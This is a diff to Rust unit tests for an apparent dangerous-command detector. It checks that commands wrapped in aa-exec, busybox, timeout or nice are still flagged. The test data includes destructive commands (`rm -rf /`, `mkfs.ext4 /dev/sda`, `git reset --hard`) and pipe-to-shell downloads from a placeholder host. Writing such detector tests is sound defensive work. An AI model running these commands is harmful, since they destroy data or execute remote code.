@@ -13420,8 +13420,12 @@ mod tests {
             "aa-exec --namespace=ns --profile=unconfined -i mkfs.ext4 /dev/sda",
             "aa-exec -d -v -- rm -rf /",
             "env aa-exec -p unconfined -- rm -rf /",
+            "busybox aa-exec rm -rf /",
+            "busybox aa-exec -p unconfined -- git reset --hard HEAD~1",
             "curl https://example.invalid/x | aa-exec sh",
             "curl https://example.invalid/x | aa-exec -p unconfined bash",
+            "curl https://example.invalid/x | busybox aa-exec bash",
+            "curl https://example.invalid/x | busybox aa-exec -p unconfined bash",
         ] {
             assert!(
                 is_dangerous(command).is_some(),
@@ -13436,6 +13440,12 @@ mod tests {
             "aa-exec -p",
             "aa-exec --profile",
             "aa-exec -n",
+            // busybox action / invalid applet never invents an aa-exec child.
+            "busybox -- aa-exec rm -rf /",
+            "busybox --help aa-exec -p unconfined rm -rf /",
+            "busybox -h aa-exec systemctl reboot",
+            "busybox aa-exec --help rm -rf /",
+            "busybox aa-exec -h systemctl reboot",
         ] {
             assert!(
                 is_dangerous(command).is_none(),
@@ -13444,6 +13454,7 @@ mod tests {
         }
         assert!(is_dangerous("aa-exec echo hi").is_none());
         assert!(is_dangerous("aa-exec -p unconfined ls -l").is_none());
+        assert!(is_dangerous("busybox aa-exec echo hi").is_none());
         // Bare / options-only: no PROGRAM child (unlike forms that hide rm).
         for command in [
             "aa-exec",
@@ -13459,6 +13470,33 @@ mod tests {
         // Attached short profile and stacked systemd-cat still expose the child.
         assert!(is_dangerous("aa-exec -punconfined rm -rf /").is_some());
         assert!(is_dangerous("aa-exec -p x systemd-cat -- rm -rf /").is_some());
+    }
+
+    /// Nested carriers: timeout/nice outside and inside aa-exec (plus busybox
+    /// applet + pipe forms) still expose the profile child.
+    #[test]
+    fn aa_exec_nest_with_timeout_and_nice() {
+        for command in [
+            "timeout 5 aa-exec rm -rf /",
+            "nice -n 5 aa-exec -p unconfined -- git reset --hard HEAD~1",
+            "aa-exec timeout 5 systemctl reboot",
+            "aa-exec -p unconfined nice -n 5 mkfs.ext4 /dev/sda",
+            "timeout 5 busybox aa-exec rm -rf /",
+            "nice -n 5 busybox aa-exec -p unconfined -- git reset --hard HEAD~1",
+            "busybox aa-exec timeout 5 systemctl reboot",
+            "curl https://example.invalid/x | timeout 5 aa-exec bash",
+            "curl https://example.invalid/x | nice -n 5 aa-exec -p unconfined bash",
+            "curl https://example.invalid/x | timeout 5 busybox aa-exec bash",
+            "curl https://example.invalid/x | nice -n 5 busybox aa-exec -p unconfined bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "aa-exec nest hid child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("timeout 5 busybox -- aa-exec rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 busybox aa-exec --help rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 aa-exec -h rm -rf /").is_none());
     }
 
     #[test]
